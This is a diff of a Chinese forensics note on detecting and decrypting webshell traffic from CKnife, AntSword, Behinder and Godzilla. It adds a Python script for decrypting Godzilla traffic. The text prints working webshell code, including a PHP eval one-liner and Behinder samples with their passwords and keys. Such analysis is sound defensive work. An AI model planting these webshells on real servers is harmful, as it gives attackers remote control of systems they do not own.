@@ -81,23 +81,24 @@ edjpg软件：
 
 ### CKnife 菜刀
 
-Webshell代码：
+#### 基础代码
 
 ```php
 # npc.php
 <?php eval($_POST["npc"]);?>
 ```
 
-流量特征：
+#### 流量特征
 
 - 明文传输。
 - npc是php一句话木马的password。
 
-![img](./images/202211091032518.png)
+
+![img](images/Webshell流量分析/202211091032518.png)
 
 ### Antsword 蚁剑
 
-Webshell代码：
+#### 基础代码
 
 ```jsp
 # 4.jsp
@@ -120,16 +121,16 @@ if(cls!=null){
 %>
 ```
 
-流量特征：
+#### 流量特征
 
 - 明文传输。
 - ant是jsp一句话木马的password。
 
-![img](./images/202211091034381.png)
+![img](images/Webshell流量分析/202211091034381.png)
 
 ### Behinder 冰蝎2
 
-Webshell代码：
+#### 基础代码
 
 ```php
 # behinder.php，密码pass
@@ -169,19 +170,19 @@ else
 ?>
 ```
 
-流量特征：
+#### 流量特征
 
 - 密文传输。
 - **Response响应包的Content Length为16。**
 
-#### 加解密
+#### 流量解密
 
 AES加密，参考工具：https://oktools.net/aes
 
 - Response响应包的content length为16的字符串为key，例如`93edbafac50eb64c`。
 - 模式：CBC，填充：Pkcs7。
 
-![img](./images/202211091042813.png)
+![img](images/Webshell流量分析/202211091042813.png)
 
 流量AES加解密示例：
 
@@ -201,7 +202,7 @@ cipher = pu+VEA885HAovMSbbH5wj3cXwQkpnSRYpZy8fAWrRA3ETLuyZqRQSm6koxDp1mKeTYLUlMk
 
 ### Behinder 冰蝎3
 
-Webshell代码：
+#### 基础代码
 
 ```php
 # behinder3.php，密码rebeyond
@@ -234,20 +235,17 @@ session_start();
 ?>
 ```
 
-流量特征：
+#### 流量特征
 
 - 冰蝎最小的流量包，**请求头的content length都大于5000**。
 - 采用POST方式进行连接。
-
-#### 加解密
-
 - 数据包中都是base64编码，WAF无法防御。
 
-![img](./images/202211091045328.png)
+![img](images/Webshell流量分析/202211091045328.png)
 
 ### Godzilla 哥斯拉
 
-Webshell代码：
+#### 基础代码
 
 - 生成php的webshell代码：管理→生成
 
@@ -307,8 +305,42 @@ $key='3c6e0b8a9c15224a';   # key的md5前16位
 echo substr(md5($pass.$key),16);
 ```
 
-流量特征：
+#### 流量特征
 
 - 每一个响应流量最后都带有`6c37ac826a2a04bc`。
 
-![img](./images/202211091046532.png)
+![img](images/Webshell流量分析/202211091046532.png)
+
+
+#### 流量解密
+
+```python
+# -*- coding: utf-8 -*-
+
+import base64
+import zlib
+from Crypto.Cipher import AES
+import binascii
+from Crypto.Util.Padding import pad, unpad
+
+BLOCK_SIZE = 32
+def aes_decode(data, key):
+    try:
+        aes = AES.new(str.encode(key), AES.MODE_ECB)
+        decrypted_text = aes.decrypt(pad(data,BLOCK_SIZE))
+        decrypted_text = decrypted_text[:-(decrypted_text[-1])]
+    except Exception as e:
+        print(e)
+    return decrypted_text
+
+
+# key 示例：12340xxxx1901234
+# s 示例：c5144463f178b352c5xxxxxxxxxxxxx528ebfc4a79b03aea0e31c
+key = "<YOUR_KEY_HERE>"
+s = "<YOUR_RAW_STRING_HERE>"
+s = binascii.a2b_hex(s)
+s = aes_decode(s,key)
+print(s)
+s = base64.b64encode(zlib.decompress(s,30))
+print(base64.b64decode(s))
+```
